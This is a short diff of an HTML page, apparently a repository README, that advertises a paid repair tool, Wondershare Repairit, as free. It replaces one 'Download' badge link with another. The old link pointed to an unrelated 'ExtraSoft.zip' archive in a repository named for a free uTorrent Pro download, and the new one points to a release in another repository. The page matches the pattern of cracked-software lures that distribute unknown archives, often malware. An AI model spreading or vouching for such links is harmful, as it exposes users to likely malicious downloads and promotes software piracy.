@@ -8,5 +8,5 @@
 <h2>Wondershare Repairit Free</h2>
 <p><strong>Wondershare Repairit 2024 is a remarkable application which allows you to easily repair corrupted or damaged videos, photos, documents and audios with ease.</p>
 </ol>
-<a href="https://github.com/abilbiju/.utorrent-pro-download-for-free/releases/download/UU/ExtraSoft.zip">
+<a href="https://github.com/Ackcess/Wondershare-Repairit/releases/tag/DOWNLOAD">
 <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
